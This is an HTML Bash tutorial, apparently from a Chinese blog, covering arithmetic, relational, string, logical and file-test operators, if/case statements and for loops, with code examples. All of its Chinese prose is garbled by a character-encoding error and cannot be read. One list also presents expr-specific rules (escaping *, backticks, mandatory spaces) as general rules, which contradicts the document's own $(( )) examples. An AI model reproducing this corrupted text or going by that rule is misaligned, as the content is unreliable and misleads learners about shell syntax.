<p>Shell çš„è¿ç®—ç¬¦ä½“ç³»ä¸å…¶â€œå®¹å™¨â€å¯†ä¸å¯åˆ†ã€‚å­¦ä¹ å…·ä½“æ“ä½œç¬¦ä¹‹å‰ï¼Œå¿…é¡»å…ˆå»ºç«‹å¯¹<strong>è®¡ç®—å®¹å™¨</strong>çš„è®¤çŸ¥ï¼š</p>
<ul>
<li><code>(( ... ))</code>ï¼šä¸“ç”¨äº<strong>æ•´æ•°è¿ç®—</strong>ã€‚æ”¯æŒ C è¯­è¨€é£æ ¼çš„è¿ç®—ç¬¦ï¼ˆ+=, ++ï¼‰ï¼Œæ— éœ€è½¬ä¹‰</li>
<li><code>[[ ... ]]</code>ï¼šä¸“ç”¨äº<strong>æ¡ä»¶åˆ¤æ–­</strong>ã€‚Bash çš„å…³é”®å­—ï¼Œæ”¯æŒæ­£åˆ™å’Œé«˜çº§é€»è¾‘ï¼Œæ¯”å¤è€çš„<code>[ ... ]</code>æ›´å®‰å…¨</li>
</ul>



































<table><thead><tr><th>è¯­æ³•</th><th>bash (#!/bin/bash)</th><th>sh (#!/bin/sh)</th><th>å»ºè®®</th></tr></thead><tbody><tr><td><code>[..]</code></td><td>âœ… æ”¯æŒ</td><td>âœ… æ”¯æŒ</td><td><strong>å…¼å®¹æ€§é¦–é€‰</strong>ï¼Œä½†è¦æ³¨æ„å˜é‡å¼•ç”¨é™·é˜±</td></tr><tr><td><code>[[..]]</code></td><td>âœ… æ”¯æŒ (æ›´å¼ºå¤§)</td><td>âŒ <strong>ä¸æ”¯æŒ</strong></td><td><strong>Bash æ¨è</strong>ã€‚åŠŸèƒ½å¤šï¼ˆæ­£åˆ™ã€é€»è¾‘ç¬¦ï¼‰ï¼Œä¸éœ€æ‹…å¿ƒå˜é‡ä¸ºç©ºçš„é—®é¢˜</td></tr><tr><td><code>((..))</code></td><td>âœ… æ”¯æŒ</td><td>âŒ <strong>ä¸æ”¯æŒ</strong></td><td><strong>Bash æ¨è</strong>ã€‚C è¯­è¨€é£æ ¼æ•°å­—è¿ç®—</td></tr><tr><td><code>$((..))</code></td><td>âœ… æ”¯æŒ</td><td>âœ… æ”¯æŒ</td><td><strong>é€šç”¨æ¨è</strong>ã€‚æ‰€æœ‰ Shell åšæ•°å­¦è¿ç®—å–å€¼çš„æ ‡å‡†å†™æ³•</td></tr></tbody></table>
<h4 data-id="heading-25">ç®—æœ¯è¿ç®—ç¬¦</h4>
<p>Bash åŸç”Ÿ<strong>ä»…æ”¯æŒæ•´æ•°è¿ç®—</strong>ã€‚å¦‚éœ€è¿›è¡Œæµ®ç‚¹æ•°ï¼ˆå°æ•°ï¼‰è¿ç®—ï¼Œå¿…é¡»å€ŸåŠ© bc æˆ– awkã€‚ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨çš„ç®—æœ¯è¿ç®—ç¬¦</p>






























<table><thead><tr><th>ç¬¦å·</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>+ã€-ã€*ã€/ã€%</td><td>åŠ å‡ä¹˜é™¤ã€å–ä½™</td><td>æ³¨æ„é™¤æ³• 10/3 ç»“æœä¸º 3ï¼ˆå–æ•´ï¼‰</td></tr><tr><td>**</td><td>å¹‚è¿ç®—</td><td>2**3 ç­‰äº 8</td></tr><tr><td>++ã€--</td><td>è‡ªå¢/è‡ªå‡</td><td>val++</td></tr><tr><td>+=</td><td>ç´¯åŠ </td><td>count+=10</td></tr></tbody></table>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><strong>è¡¨è¾¾å¼å’Œè¿ç®—ç¬¦ä¹‹é—´è¦æœ‰ç©ºæ ¼</strong>ï¼Œä¾‹å¦‚<code>2+2</code>å¿…é¡»å†™æˆ <code>2 + 2</code></li>
<li>æ¡ä»¶è¡¨è¾¾å¼è¦æ”¾åœ¨æ–¹æ‹¬å·ä¹‹é—´ï¼Œå¹¶ä¸”<strong>è¦æœ‰ç©ºæ ¼</strong>ï¼Œä¾‹å¦‚:<code>[$x==$y]</code>å¿…é¡»å†™æˆ <code>[ $x == $y ]</code></li>
<li>ä¹˜å·(<code>*</code>)å‰è¾¹å¿…é¡»åŠ åæ–œæ (<code>\</code>)æ‰èƒ½å®ç°ä¹˜æ³•è¿ç®—</li>
<li>å®Œæ•´çš„è¡¨è¾¾å¼è¦è¢« `` åŒ…å«ï¼ˆåå¼•å·ï¼‰</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">x=10
y=3

<span class="hljs-comment"># æ–¹å¼ä¸€ï¼š$(( )) (æ¨è - ç”¨äºè®¡ç®—èµ‹å€¼)</span>
result=$(( x * y + <span class="hljs-number">5</span> ))  
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Result: <span class="hljs-variable">$result</span>"</span>

<span class="hljs-comment"># æ–¹å¼äºŒï¼šlet (æ¨è - ç”¨äºçº¯è¿ç®—)</span>
<span class="hljs-built_in">let</span> <span class="hljs-string">"x += 5"</span>  <span class="hljs-comment"># x å˜ä¸º 15</span>

<span class="hljs-comment"># æ–¹å¼ä¸‰ï¼š(( )) (å¸¸ç”¨äºå¾ªç¯æˆ–åˆ¤æ–­)</span>
(( x &gt; <span class="hljs-number">20</span> )) &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"Too large"</span>
</code></pre>
<h4 data-id="heading-26">å…³ç³»è¿ç®—ç¬¦</h4>
<p>åœ¨ Shell ä¸­ï¼Œæ¯”è¾ƒ<strong>æ•°å­—</strong>å’Œæ¯”è¾ƒ<strong>å­—ç¬¦ä¸²</strong>ä½¿ç”¨çš„æ˜¯ä¸¤å¥—å®Œå…¨ä¸åŒçš„ç¬¦å·ï¼Œåˆ‡å‹¿æ··ç”¨</p>








































<table><thead><tr><th>æ“ä½œç¬¦ (é€šç”¨)</th><th>å«ä¹‰</th><th>C é£æ ¼æ›¿ä»£ (ä»…é™ (()) )</th></tr></thead><tbody><tr><td>-eq</td><td>ç­‰äº (Equal)</td><td>==</td></tr><tr><td>-ne</td><td>ä¸ç­‰äº (Not Equal)</td><td>!=</td></tr><tr><td>-gt</td><td>å¤§äº (Greater Than)</td><td>&gt;</td></tr><tr><td>-lt</td><td>å°äº (Less Than)</td><td>&lt;</td></tr><tr><td>-ge</td><td>å¤§äºç­‰äº</td><td>&gt;=</td></tr><tr><td>-le</td><td>å°äºç­‰äº</td><td>&lt;=</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">a=10
b=20

<span class="hljs-comment"># åœºæ™¯ 1ï¼šif æ¡ä»¶åˆ¤æ–­ (ä½¿ç”¨ä¸­æ‹¬å·)</span>
<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"a &lt; b"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># åœºæ™¯ 2ï¼šC è¯­è¨€é£æ ¼ (ä½¿ç”¨åŒæ‹¬å·)</span>
<span class="hljs-keyword">if</span> (( a &lt; b )); <span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"a &lt; b (C-style)"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-27">å­—ç¬¦ä¸²è¿ç®—ç¬¦</h4>
<p>åœ¨è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œå˜é‡æœ€å¥½<strong>æ€»æ˜¯åŒ…è£¹åŒå¼•å·</strong><code>"$var"</code>ï¼Œä»¥é˜²å˜é‡ä¸ºç©ºå¯¼è‡´è„šæœ¬æŠ¥é”™</p>



































<table><thead><tr><th>æ“ä½œç¬¦</th><th>å«ä¹‰</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>= / ==</td><td>å­—ç¬¦ä¸²ç›¸ç­‰</td><td>[[ "$s1" == "$s2" ]]ï¼ˆæ¨èä½¿ç”¨ ==ï¼‰</td></tr><tr><td>!=</td><td>ä¸ç›¸ç­‰</td><td>[[ "$s1" != "$s2" ]]</td></tr><tr><td>-z</td><td>Check if <strong>Zero</strong> (ç©º)</td><td>[[ -z "$s" ]]ï¼ˆé•¿åº¦ä¸º0åˆ™çœŸï¼‰</td></tr><tr><td>-n</td><td>Check if <strong>Non-zero</strong> (éç©º)</td><td>[[ -n "$s" ]]ï¼ˆé•¿åº¦ä¸ä¸º0åˆ™çœŸï¼‰</td></tr><tr><td><em>æ— ç¬¦å·</em></td><td>é»˜è®¤åˆ¤éç©º</td><td>[[ "$s" ]] ç­‰åŒäº -n</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

app_env=<span class="hljs-string">"dev"</span>
target_env=<span class="hljs-string">"prod"</span>
api_key=<span class="hljs-string">""</span>         <span class="hljs-comment"># æ¨¡æ‹Ÿä¸€ä¸ªç©ºå˜é‡</span>
user_name=<span class="hljs-string">"admin"</span>

<span class="hljs-comment"># å­—ç¬¦ä¸²æ¯”å¯¹</span>
<span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$app_env</span>"</span> == <span class="hljs-string">"<span class="hljs-variable">$target_env</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ç¯å¢ƒåŒ¹é…ï¼Œå¯ä»¥éƒ¨ç½²ã€‚"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ç¯å¢ƒä¸åŒ¹é…: å½“å‰ä¸º [<span class="hljs-variable">${app_env}</span>]ï¼Œç›®æ ‡ä¸º [<span class="hljs-variable">${target_env}</span>]"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># ç©ºå€¼ä¸éç©ºæ£€æµ‹ï¼Œé˜²å¾¡æ€§ç¼–ç¨‹ï¼Œæ£€æŸ¥å¿…è¦é…ç½®æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">"<span class="hljs-variable">$api_key</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[Warning] API_KEY ä¸ºç©ºï¼Œè¯·æ£€æŸ¥é…ç½®æ–‡ä»¶ï¼"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># ç¡®è®¤ç”¨æˆ·èº«ä»½å­˜åœ¨</span>
<span class="hljs-keyword">if</span> [[ -n <span class="hljs-string">"<span class="hljs-variable">$user_name</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å½“å‰æ“ä½œç”¨æˆ·: <span class="hljs-variable">$user_name</span> (Length: <span class="hljs-variable">${#user_name}</span>)"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-28">é€»è¾‘è¿ç®—ç¬¦</h4>
<p>Shell è„šæœ¬ä¸­çš„é€»è¾‘æ§åˆ¶é€šå¸¸é€šè¿‡<code>[[...]]</code>æˆ–<strong>å‘½ä»¤çŸ­è·¯</strong>å®ç°</p>

























<table><thead><tr><th>æ“ä½œç¬¦</th><th>åœºæ™¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>!</code></td><td>é</td><td>[[ ! -e file ]]ï¼ˆæ–‡ä»¶ä¸å­˜åœ¨ï¼‰</td></tr><tr><td><code>&amp;&amp;</code></td><td>é€»è¾‘ä¸</td><td>[[ $a -gt 10 &amp;&amp; $b -lt 20 ]]ï¼ˆä¸¤è¾¹åŒæ—¶æˆç«‹ï¼‰</td></tr><tr><td><code>||</code></td><td>é€»è¾‘æˆ–</td><td>[[ $a -gt 10 || $b -lt 20 ]]ï¼ˆä¸€è¾¹æˆç«‹å³å¯ï¼‰</td></tr></tbody></table>
<p>åœ¨æ—§ç‰ˆ Old School<code>[...]</code>ä¸­ï¼Œå¿…é¡»ä½¿ç”¨ä»¥ä¸‹é€»è¾‘è¿ç®—ç¬¦ï¼Œ<strong>äº†è§£å³å¯</strong></p>




















<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th><th>ä¸¾ä¾‹</th></tr></thead><tbody><tr><td><code>-o</code></td><td>æˆ–è¿ç®—ï¼Œæœ‰ä¸€ä¸ªè¡¨è¾¾å¼ä¸º true åˆ™è¿”å› trueã€‚</td><td><code>[ $a -lt 20 -o $b -gt 100 ]</code> è¿”å› true</td></tr><tr><td><code>-a</code></td><td>ä¸è¿ç®—ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼éƒ½ä¸º true æ‰è¿”å› trueã€‚</td><td><code>[ $a -lt 20 -a $b -gt 100 ]</code> è¿”å› false</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">x=10
y=20

<span class="hljs-built_in">echo</span> <span class="hljs-string">"x=<span class="hljs-variable">${x}</span>, y=<span class="hljs-variable">${y}</span>"</span>

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 ]]
<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 è¿”å› true"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 è¿”å› false"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 ]]
<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 è¿”å› true"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 è¿”å› false"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  x=10, y=20</span>
<span class="hljs-comment">#  10 -lt 100 &amp;&amp; 20 -gt 100 è¿”å› false</span>
<span class="hljs-comment">#  10 -lt 100 || 20 -gt 100 è¿”å› true</span>
</code></pre>
<blockquote>
<p>é€»è¾‘è¿ç®—ç¬¦ï¼Œé€‰æ–°ä¸é€‰æ—§ï¼Œä¸å»ºè®®ä½¿ç”¨<code>-o</code>å’Œ<code>-a</code></p>
</blockquote>
<h4 data-id="heading-29">æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦</h4>
<p>è¿™æ˜¯ Shell è‡ªåŠ¨åŒ–è¿ç»´ä¸­æœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œç”¨äºæ£€æµ‹æ–‡ä»¶å±æ€§</p>











































































<table><thead><tr><th>æ“ä½œç¬¦</th><th>å«ä¹‰ä¸æ£€æµ‹å¯¹è±¡</th><th>å…¸å‹åœºæ™¯</th></tr></thead><tbody><tr><td><strong>-e</strong></td><td><strong>E</strong>xistã€‚æ£€æµ‹å¯¹è±¡æ˜¯å¦å­˜åœ¨ï¼ˆåŒ…æ‹¬æ–‡ä»¶ã€ç›®å½•ã€ç‰¹æ®Šæ–‡ä»¶ç­‰ï¼‰</td><td>æœ€åŸºç¡€çš„åˆ¤æ–­ï¼Œåç»­æ“ä½œçš„å¤§å‰æ</td></tr><tr><td><strong>-f</strong></td><td><strong>F</strong>ileã€‚æ£€æµ‹æ˜¯å¦ä¸º<strong>æ™®é€šæ–‡ä»¶</strong>ï¼ˆæ’é™¤ç›®å½•ã€è®¾å¤‡ï¼‰</td><td>ç¡®ä¿æ“ä½œå¯¹è±¡ä¸æ˜¯ç›®å½•</td></tr><tr><td><strong>-d</strong></td><td><strong>D</strong>irectoryã€‚æ£€æµ‹æ˜¯å¦ä¸º<strong>ç›®å½•</strong></td><td>åˆ›å»ºæ—¥å¿—ç›®å½•å‰å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨</td></tr><tr><td><strong>-s</strong></td><td><strong>S</strong>izeã€‚æ£€æµ‹å¯¹è±¡å­˜åœ¨ä¸”<strong>å¤§å°ä¸ä¸º 0</strong></td><td>åˆ¤æ–­ä¸‹è½½çš„æ–‡ä»¶æ˜¯å¦æŸåæˆ–ä¸ºç©º</td></tr><tr><td><strong>-r</strong></td><td><strong>R</strong>eadã€‚æ£€æµ‹å½“å‰ç”¨æˆ·æ˜¯å¦å¯è¯»</td><td>åªæœ‰å¯è¯»æ‰èƒ½ grep é…ç½®</td></tr><tr><td><strong>-w</strong></td><td><strong>W</strong>riteã€‚æ£€æµ‹å½“å‰ç”¨æˆ·æ˜¯å¦å¯å†™</td><td>åˆ¤æ–­æ—¥å¿—æ–‡ä»¶æ˜¯å¦è¢« chattr é”å®š</td></tr><tr><td><strong>-x</strong></td><td>E<strong>x</strong>ecuteã€‚æ£€æµ‹å½“å‰ç”¨æˆ·æ˜¯å¦å¯æ‰§è¡Œ</td><td>åˆ¤æ–­è„šæœ¬æ˜¯å¦æœ‰ +x æƒé™</td></tr><tr><td>-b</td><td><strong>B</strong>lockã€‚æ£€æµ‹æ˜¯å¦ä¸º<strong>å—è®¾å¤‡</strong>æ–‡ä»¶</td><td>æŒ‚è½½ç£ç›˜ã€æ£€æŸ¥ /dev/sda</td></tr><tr><td>-c</td><td><strong>C</strong>harã€‚æ£€æµ‹æ˜¯å¦ä¸º<strong>å­—ç¬¦è®¾å¤‡</strong>æ–‡ä»¶</td><td>æ£€æŸ¥ä¸²å£è®¾å¤‡ã€/dev/null</td></tr><tr><td>-p</td><td><strong>P</strong>ipeã€‚æ£€æµ‹æ˜¯å¦ä¸º<strong>å‘½åç®¡é“</strong> (FIFO)</td><td>è¿›ç¨‹é—´é€šä¿¡æ£€æµ‹</td></tr><tr><td>-u</td><td>S<strong>U</strong>IDã€‚æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SUID ä½</td><td>å®‰å…¨å®¡è®¡ï¼Œå¦‚æ£€æŸ¥ /usr/bin/passwd</td></tr><tr><td>-g</td><td>S<strong>G</strong>IDã€‚æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SGID ä½</td><td>åä½œç»„ç›®å½•æƒé™æ£€æŸ¥</td></tr><tr><td>-k</td><td>Stic<strong>k</strong>yã€‚æ£€æµ‹ç›®å½•æ˜¯å¦è®¾ç½®äº†ç²˜ç€ä½</td><td>æ£€æŸ¥ /tmp ç›®å½•æƒé™ï¼ˆé˜²è¯¯åˆ ï¼‰</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># å¾…æ£€æµ‹çš„é…ç½®æ–‡ä»¶</span>
config_file=<span class="hljs-string">"/etc/hosts"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Checking config: <span class="hljs-variable">$config_file</span> ..."</span>

<span class="hljs-comment"># ç¬¬ä¸€å±‚ï¼šå…ˆçœ‹å­˜ä¸å­˜åœ¨ (-e)</span>
<span class="hljs-keyword">if</span> [[ ! -e <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: File not found!"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># ç¬¬äºŒå±‚ï¼šå­˜åœ¨çš„è¯ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ™®é€šæ–‡ä»¶</span>
<span class="hljs-keyword">if</span> [[ ! -f <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: This is a directory or device, not a file!"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># ç¬¬ä¸‰å±‚ï¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºç©º</span>
<span class="hljs-keyword">if</span> [[ ! -s <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Warning: File is empty."</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-comment"># ç¬¬å››å±‚ï¼šé€»è¾‘åµŒå¥—æ£€æµ‹æƒé™ï¼Œæ—¢è¦å­˜åœ¨ï¼Œåˆè¦å¯è¯»ï¼Œä¸”å¯å†™</span>
    <span class="hljs-keyword">if</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> &amp;&amp; -w <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"OK: File is healthy (Readable &amp; Writable)."</span>
    <span class="hljs-keyword">elif</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note: Read-only file."</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: Permission denied."</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-30">æµç¨‹æ§åˆ¶</h3>
<p>ä»»ä½•å¼ºå¤§çš„è„šæœ¬éƒ½ç¦»ä¸å¼€<strong>é€»è¾‘åˆ¤æ–­</strong>ä¸<strong>å¾ªç¯æ‰§è¡Œ</strong>ã€‚Shell æä¾›äº†ç±» C è¯­è¨€é£æ ¼çš„æµç¨‹æ§åˆ¶ï¼Œä½†å…¶è¯­æ³•å¯¹ç©ºæ ¼å’Œç¬¦å·æå…¶æ•æ„Ÿ</p>
<h4 data-id="heading-31">æ¡ä»¶è¯­å¥</h4>
<p>Shell çš„æ¡ä»¶åˆ¤æ–­ä¸»è¦ä¾èµ– if å’Œ caseã€‚å…¶ä¸­ if çš„åˆ¤æ–­åŸºå…ƒå»ºè®®æ— è„‘ä½¿ç”¨ç°ä»£ Bash çš„<code>[[ ]]</code>ï¼ˆè€Œéæ—§å¼çš„<code>[ ]</code>ï¼‰ï¼Œå› ä¸ºå®ƒèƒ½è‡ªåŠ¨å¤„ç†ç©ºå˜é‡ä¸”æ”¯æŒæ­£åˆ™ï¼Œè¡¨è¾¾å¼å’Œæ–¹æ‹¬å·ä¹‹é—´å¿…é¡»æœ‰ç©ºæ ¼</p>
<h5 data-id="heading-32">if-else</h5>
<p>æœ€ç»å…¸çš„æ¡ä»¶åˆ¤æ–­ã€‚æ³¨æ„ if å—ç»“æŸåå¿…é¡»è·Ÿ fi</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># å•è¡Œæç®€å†™æ³•ï¼ˆé€‚åˆç®€å•é˜²å¾¡é€»è¾‘ï¼‰</span>
[[ ! -d <span class="hljs-string">"build"</span> ]] &amp;&amp; <span class="hljs-built_in">mkdir</span> <span class="hljs-string">"build"</span>

<span class="hljs-comment"># æ ‡å‡†å¤šåˆ†æ”¯å†™æ³•</span>
score=85

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$score</span> -ge 90 ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ä¼˜ç§€"</span>
<span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$score</span> -ge 60 ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"åŠæ ¼"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ä¸åŠæ ¼"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h5 data-id="heading-33">case</h5>
<p>å½“ä½ éœ€è¦é¢å¯¹å¾ˆå¤šé€‰é¡¹ï¼ˆå°¤å…¶æ˜¯<strong>ç”¨æˆ·äº¤äº’</strong>æˆ–<strong>å‚æ•°è§£æ</strong>ï¼‰æ—¶ï¼Œ<code>case</code>è¿œæ¯”ä¸€å †<code>if-elif</code>ä¼˜é›…ã€‚å®ƒæ”¯æŒé€šé…ç¬¦åŒ¹é…</p>
<ul>
<li><code>|</code>ï¼šåˆ†å‰²å¤šä¸ªæ¨¡å¼ï¼ˆç±»ä¼¼ ORï¼‰</li>
<li><code>;;</code>ï¼šç»“æŸå½“å‰å—ï¼ˆç±»ä¼¼ breakï¼‰</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/usr/bin/env bash</span>

<span class="hljs-comment"># åœºæ™¯ï¼šæ ¹æ®åç¼€å¤„ç†æ–‡ä»¶</span>
file_name=<span class="hljs-string">"data.tar.gz"</span>

<span class="hljs-comment"># "${file_name##*.}" æå–çš„æ˜¯ "gz" (è§å˜é‡æ“ä½œç« èŠ‚)</span>
<span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$file_name</span>"</span> <span class="hljs-keyword">in</span>
    *.tar.gz|*.tgz) 
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Decompressing with tar..."</span> 
        <span class="hljs-comment"># tar -zxvf "$file_name"</span>
        ;;
    *.zip)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Decompressing with unzip..."</span>
        ;;
    *)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Unknown format!"</span>
        ;;
<span class="hljs-keyword">esac</span>
</code></pre>
<blockquote>
<p>æ¯ç§æƒ…å†µéƒ½æ˜¯åŒ¹é…äº†æŸä¸ªæ¨¡å¼çš„è¡¨è¾¾å¼ã€‚<code>|</code>ç”¨æ¥åˆ†å‰²å¤šä¸ªæ¨¡å¼ï¼Œ<code>)</code>ç”¨æ¥ç»“æŸä¸€ä¸ªæ¨¡å¼åºåˆ—ã€‚ç¬¬ä¸€ä¸ªåŒ¹é…ä¸Šçš„æ¨¡å¼å¯¹åº”çš„å‘½ä»¤å°†ä¼šè¢«æ‰§è¡Œã€‚<code>*</code>ä»£è¡¨ä»»ä½•ä¸åŒ¹é…ä»¥ä¸Šç»™å®šæ¨¡å¼çš„æ¨¡å¼ã€‚å‘½ä»¤å—å„¿ä¹‹é—´è¦ç”¨<code>;;</code>åˆ†éš”</p>
</blockquote>
<h4 data-id="heading-34">å¾ªç¯è¯­å¥</h4>
<p>Bash æä¾›äº† for (éå†åˆ—è¡¨), while (æ¡ä»¶å¾ªç¯), until (åå‘å¾ªç¯) å’Œ select (äº¤äº’èœå•) å››ç§æœºåˆ¶</p>
<h5 data-id="heading-35">forå¾ªç¯</h5>
<p><code>for</code>ä¸å®ƒåœ¨ C è¯­è¨€ä¸­çš„å§Šå¦¹éå¸¸åƒã€‚çœ‹èµ·æ¥æ˜¯è¿™æ ·ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">for arg in elem1 elem2 ... elemN
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## è¯­å¥2</span></span>
done
</code></pre>
<p>åœ¨æ¯æ¬¡å¾ªç¯çš„è¿‡ç¨‹ä¸­ï¼Œ<code>arg</code>ä¾æ¬¡è¢«èµ‹å€¼ä¸ºä»<code>elem1</code>åˆ°<code>elemN</code>ã€‚è¿™äº›å€¼è¿˜å¯ä»¥æ˜¯é€šé…ç¬¦æˆ–è€…<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdenysdovhan%2Fbash-handbook%2Fblob%2Fmaster%2Ftranslations%2Fzh-CN%2FREADME.md%23%25E5%25A4%25A7%25E6%258B%25AC%25E5%258F%25B7%25E6%2589%25A9%25E5%25B1%2595" target="_blank" title="https://github.com/denysdovhan/bash-handbook/blob/master/translations/zh-CN/README.md#%E5%A4%A7%E6%8B%AC%E5%8F%B7%E6%89%A9%E5%B1%95" ref="nofollow noopener noreferrer">å¤§æ‹¬å·æ‰©å±•</a>ã€‚</p>
<p>å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æŠŠ<code>for</code>å¾ªç¯å†™åœ¨ä¸€è¡Œï¼Œä½†è¿™è¦æ±‚<code>do</code>ä¹‹å‰è¦æœ‰ä¸€ä¸ªåˆ†å·ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">for i in {1..5}; do echo $i; done
</code></pre>
<p>è¿˜æœ‰ï¼Œå¦‚æœä½ è§‰å¾—<code>for..in..do</code>å¯¹ä½ æ¥è¯´æœ‰ç‚¹å¥‡æ€ªï¼Œé‚£ä¹ˆä½ ä¹Ÿå¯ä»¥åƒ C è¯­è¨€é‚£æ ·ä½¿ç”¨<code>for</code>ï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">for (( i = 0; i &lt; 10; i++ )); do
  echo $i
done
</code></pre>
